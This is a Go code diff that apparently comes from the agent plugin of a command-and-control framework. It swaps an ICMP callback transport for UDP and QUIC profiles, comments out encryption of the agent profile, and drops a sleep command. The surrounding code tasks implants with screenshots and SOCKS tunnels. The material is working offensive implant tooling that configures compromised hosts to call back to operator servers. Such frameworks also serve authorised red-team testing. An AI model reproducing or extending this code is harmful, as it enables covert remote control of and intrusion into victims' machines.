@@ -118,7 +118,7 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 		}
 		profileData, _ = msgpack.Marshal(profile)
 
-	case "icmp":
+	case "udp":
 
 		servers, _ := listenerMap["callback_addresses"].(string)
 
@@ -127,24 +127,40 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 		servers = strings.TrimSuffix(servers, ",")
 		addresses := strings.Split(servers, ",")
 
-		maxFragmentSize, _ := listenerMap["max_fragment_size"].(float64)
-		if maxFragmentSize == 0 {
-			maxFragmentSize = 65000
+		profile := Profile{
+			Type:        uint(agentWatermark),
+			Protocol:    "udp",
+			Addresses:   addresses,
+			BannerSize:  0,
+			ConnTimeout: reconnectTimeout,
+			ConnCount:   generateConfig.ReconnectCount,
+			UseSSL:      false,
+			SslCert:     nil,
+			SslKey:      nil,
+			CaCert:      nil,
 		}
+		profileData, _ = msgpack.Marshal(profile)
 
-		sleepTime, _ := listenerMap["sleep_time"].(float64)
-		if sleepTime == 0 {
-			sleepTime = 5 // 默认5秒
-		}
+	case "quic":
+
+		servers, _ := listenerMap["callback_addresses"].(string)
+
+		servers = strings.ReplaceAll(servers, " ", "")
+		servers = strings.ReplaceAll(servers, "\n", ",")
+		servers = strings.TrimSuffix(servers, ",")
+		addresses := strings.Split(servers, ",")
 
 		profile := Profile{
-			Type:            uint(agentWatermark),
-			Protocol:        "icmp",
-			Addresses:       addresses,
-			ConnTimeout:     reconnectTimeout,
-			ConnCount:       generateConfig.ReconnectCount,
-			MaxFragmentSize: int(maxFragmentSize),
-			SleepTime:       int(sleepTime),
+			Type:        uint(agentWatermark),
+			Protocol:    "quic",
+			Addresses:   addresses,
+			BannerSize:  0,
+			ConnTimeout: reconnectTimeout,
+			ConnCount:   generateConfig.ReconnectCount,
+			UseSSL:      false,
+			SslCert:     nil,
+			SslKey:      nil,
+			CaCert:      nil,
 		}
 		profileData, _ = msgpack.Marshal(profile)
 
@@ -152,7 +168,7 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 		return nil, errors.New("protocol unknown")
 	}
 
-	profileData, _ = AgentEncryptData(profileData, encryptKey)
+	// profileData, _ = AgentEncryptData(profileData, encryptKey)
 	profileData = append(encryptKey, profileData...)
 
 	profileString := ""
@@ -622,15 +638,6 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 
 	case "screenshot":
 		cmd = Command{Code: COMMAND_SCREENSHOT, Data: nil}
-
-	case "sleep":
-		seconds, ok := args["seconds"].(float64)
-		if !ok || seconds < 1 {
-			err = errors.New("parameter 'seconds' must be a positive integer")
-			goto RET
-		}
-		packerData, _ := msgpack.Marshal(ParamsSleep{Seconds: int(seconds)})
-		cmd = Command{Code: COMMAND_SLEEP, Data: packerData}
 
 	case "socks":
 		taskData.Type = TYPE_TUNNEL
@@ -1444,15 +1451,6 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 					continue
 				}
 				task.Message = fmt.Sprintf("Archive '%s' successfully created", params.Path)
-				task.MessageType = MESSAGE_SUCCESS
-
-			case COMMAND_SLEEP:
-				var params AnsSleep
-				err := msgpack.Unmarshal(cmd.Data, &params)
-				if err != nil {
-					continue
-				}
-				task.Message = fmt.Sprintf("Sleep time changed to %d seconds", params.Seconds)
 				task.MessageType = MESSAGE_SUCCESS
 
 			case COMMAND_ERROR:
